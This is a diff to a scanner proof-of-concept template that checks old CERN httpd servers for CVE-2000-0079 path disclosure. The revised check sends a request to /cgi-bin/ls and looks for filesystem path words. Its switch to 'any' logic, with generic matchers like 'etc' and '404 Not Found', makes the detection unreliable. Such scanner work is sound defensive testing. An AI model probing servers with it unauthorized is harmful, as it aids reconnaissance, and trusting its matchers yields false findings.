@@ -1,13 +1,13 @@
 [info]
-author = "ave"
-description = "W3C CERN httpd HTTP server allows remote attackers to determine the real pathnames of some commands via a request for a nonexistent URL. This PoC sends a request to a nonexistent path and checks whether the server response discloses real filesystem path information."
+author = "AVE"
+description = "CERN httpd 对不存在的 URL 返回错误信息时泄露真实路径。发送 GET /cgi-bin/ls 请求，根据响应中是否包含文件系统路径判断漏洞是否存在。"
 id = "POC-AVE-2000-0065"
-name = "CVE-2000-0079 Path Disclosure PoC"
-severity = "medium"
+name = "W3C CERN httpd 路径泄露漏洞 PoC"
+severity = "high"
 tags = [
     "cve-2000-0079",
-    "cern-httpd",
     "path-disclosure",
+    "cern-httpd",
 ]
 vuln_id = [
     "CVE-2000-0079",
@@ -15,26 +15,34 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/nonexistent_cern_httpd_path_test_{{random}}"
+path = "/{{BaseURL}}/cgi-bin/ls"
 protocol = "http"
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "/usr/",
-    "/var/",
-    "/etc/",
-    "/home/",
-    "/opt/",
-    "cern",
-    "httpd",
+    "usr/local",
+    "usr/bin",
+    "etc",
+    "var/www",
+    "cgi-bin",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "404 Not Found",
+    "File not found",
 ]
